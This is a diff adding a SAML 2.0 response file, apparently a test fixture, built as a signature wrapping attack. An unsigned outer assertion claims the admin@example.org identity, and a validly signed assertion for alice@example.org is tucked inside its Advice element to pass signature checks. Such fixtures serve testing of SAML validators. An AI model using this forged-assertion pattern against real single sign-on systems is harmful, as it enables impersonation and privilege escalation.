@@ -1,0 +1,47 @@
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0" IssueInstant="2026-01-01T10:00:00Z" Destination="https://sp.example.org/saml/acs" InResponseTo="_req1">
+  <saml:Issuer>https://idp.example.org/metadata</saml:Issuer>
+  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
+  <saml:Assertion ID="_evil" Version="2.0" IssueInstant="2026-01-01T10:00:00Z">
+    <saml:Issuer>https://idp.example.org/metadata</saml:Issuer>
+    <saml:Subject>
+      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@example.org</saml:NameID>
+      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+        <saml:SubjectConfirmationData NotOnOrAfter="2026-01-01T10:05:00Z" Recipient="https://sp.example.org/saml/acs" InResponseTo="_req1"/>
+      </saml:SubjectConfirmation>
+    </saml:Subject>
+    <saml:Conditions NotBefore="2026-01-01T09:59:00Z" NotOnOrAfter="2026-01-01T10:05:00Z">
+      <saml:AudienceRestriction><saml:Audience>https://sp.example.org/metadata</saml:Audience></saml:AudienceRestriction>
+    </saml:Conditions>
+    <saml:AuthnStatement AuthnInstant="2026-01-01T10:00:00Z">
+      <saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext>
+    </saml:AuthnStatement>
+  <saml:Advice><saml:Assertion ID="_a1" Version="2.0" IssueInstant="2026-01-01T10:00:00Z">
+    <saml:Issuer>https://idp.example.org/metadata</saml:Issuer>
+    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/><ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/><ds:Reference URI="#_a1"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>4PLEGBWxjt/uxIdloUYZAdodzhnd96TvgT/aFEBlMVo=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>e0odfHrPZXybx7QM7OZ8dixkcgxMDpVuHc9gjrambeHL5p01bub8REekcV3/8z991ZFNPn+qBYPQZUy16Tx/baT9flIWgrV8Jhz0cw3RtH9s63nMIp0/2pY9NgdAptQQ1u0Z0/sK6pcX/AUn7aCiJLCJ7CKeXlQuYyNGl4Rs5+3vhJE90ntrFaTHU7Uno9gAXu43GmJjpA9iMFGwdCAL902g/H5/oMQCdX4xnEA/pNOwBc6fYxTR4iGcLdcSdYSZArIBmVaOEQ7t1nOAxNmgf6IB6cxk85H7lbaNnQcJ7dZqndhUsaVf1Hj1qT96swuX+6naHTLiV8bLZQHkVzMtzw==</ds:SignatureValue><ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICwDCCAaigAwIBAgIUT5ccNqZoTAW3z4UHda94ActEx84wDQYJKoZIhvcNAQEL
+BQAwGjEYMBYGA1UEAwwPaWRwLmV4YW1wbGUub3JnMB4XDTI1MDEwMTAwMDAwMFoX
+DTM0MTIzMDAwMDAwMFowGjEYMBYGA1UEAwwPaWRwLmV4YW1wbGUub3JnMIIBIjAN
+BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkqWNJl8qsz9MNMZLk3xqFE/xUVB/
+NrfAyzO7W7ZMYilLxHXs+xVOnPgsL7O6Ts/mXTRtPthmZuf6ye7iIH/mgbuzMHK+
+bPneMWj+8VYEPMswcdyfhUudMPGBZnfMpgzUv5532GAVyThSpGfPYey1IopBPojF
+zN5rJ2tKm629QF7+JgllLxPtBzN1Axq3El/0WSDxTN2lKqOcphQrs12DecKYiMao
+aXLOWIXhS9nHWANmbO4zx1J2Ov+Pw7UOkxj0xYlmi6pQ548dVun4mIYu3YAViVKF
+ZSQexXLNEgEa4VZFEpMGD94VMqJFnKkfXn+OihsYvJUQg5yRzUylB9+BswIDAQAB
+MA0GCSqGSIb3DQEBCwUAA4IBAQAGV1uISWI8uL4OWA9ARizqymZzaPdZR/gwdI4L
+AaThc4/lSkwUNY+PqcS6vl9Wfmn9LwCnerf7rH3HxHWH8YEtFNyd5VmZ4CgUdIU+
+GOgveh1VjKqMZV96+DtHThvjw49iuJCL+JYbQLpn82WCRIaJqwB3Mwn+AqNw/9FO
+riQdUJ12WuaEJf3spdSRhJ1N656KrF8FEj1GDY0Yf/4a+pI7LzXqhvzj9PnWZVWW
+mvO7GOT/IBlXrkfC36BpcbFo4QV0dPx2Fq2jz5XnmNRCss2vMIJ+e9KBAqxwKjvc
+kIhAGMDDKMnbB6eY8I4sen+f1oVqe7yqwaXHKljDo1iqqXWc
+</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject>
+      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">alice@example.org</saml:NameID>
+      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+        <saml:SubjectConfirmationData NotOnOrAfter="2026-01-01T10:05:00Z" Recipient="https://sp.example.org/saml/acs" InResponseTo="_req1"/>
+      </saml:SubjectConfirmation>
+    </saml:Subject>
+    <saml:Conditions NotBefore="2026-01-01T09:59:00Z" NotOnOrAfter="2026-01-01T10:05:00Z">
+      <saml:AudienceRestriction><saml:Audience>https://sp.example.org/metadata</saml:Audience></saml:AudienceRestriction>
+    </saml:Conditions>
+    <saml:AuthnStatement AuthnInstant="2026-01-01T10:00:00Z">
+      <saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext>
+    </saml:AuthnStatement>
+  </saml:Assertion></saml:Advice></saml:Assertion></samlp:Response>
